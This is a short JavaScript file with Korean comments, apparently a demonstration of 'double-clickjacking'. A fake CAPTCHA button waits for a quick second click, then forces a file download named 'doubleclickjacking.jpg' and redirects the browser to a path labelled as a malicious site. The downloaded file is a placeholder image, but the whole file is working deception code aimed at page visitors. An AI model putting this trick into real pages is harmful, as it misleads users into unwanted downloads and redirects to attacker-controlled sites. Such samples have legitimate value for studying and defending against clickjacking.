let clickCount = 0;
let timeoutId;

document.getElementById("captcha-button").addEventListener("click", function(event) {
    const button = document.getElementById("captcha-button");

    clickCount++;
    if (clickCount === 1) {
        // 첫 번째 클릭 시 버튼 색상 변경
        button.classList.add("clicked");
        console.log("첫 번째 클릭 감지. 두 번째 클릭을 기다리는 중...");
        // 500ms 이내에 두 번째 클릭이 없으면 초기화
        timeoutId = setTimeout(() => {
            clickCount = 0;
            button.classList.remove("clicked");
            console.log("두 번째 클릭이 없어 초기화되었습니다.");
        }, 500); // 500ms 이내에 두 번째 클릭이 없으면 초기화
    } else if (clickCount === 2) {
        clearTimeout(timeoutId); // 타이머 취소
        console.log("두 번째 클릭 감지. 악성 요소 삽입 중...");
        maliciousAction();
        completeCaptcha();
    }
});

function maliciousAction() {
    // 악성 요소 삽입: example.jpg 다운로드
    const link = document.createElement("a");
    link.href = "/files/example.jpg"; // 다운로드할 이미지 경로
    link.download = "doubleclickjacking.jpg"; // 다운로드 파일 이름
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    console.log("example.jpg 다운로드 완료.");
}

function completeCaptcha() {
    window.location.href = "/malicious-site1"; // 악성 웹사이트로 리디렉션
}